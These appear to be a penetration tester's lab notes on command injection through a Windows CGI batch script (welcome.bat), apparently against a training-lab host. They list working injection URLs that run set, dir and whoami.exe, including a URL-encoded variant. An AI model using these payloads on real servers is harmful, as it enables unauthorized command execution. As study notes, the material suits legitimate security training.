if we found any valid CGI script path 

Retrieve a list of environment variables 

```http
http://10.129.204.227:8080/cgi/welcome.bat?&set
```
instead of `set` we can also use `dir`

if PATH variable is unset, we have to hardcode paths in requests
```http
http://10.129.204.227:8080/cgi/welcome.bat?&c:\windows\system32\whoami.exe
```

might have to URL-encode the payload
```http
http://10.129.204.227:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
```
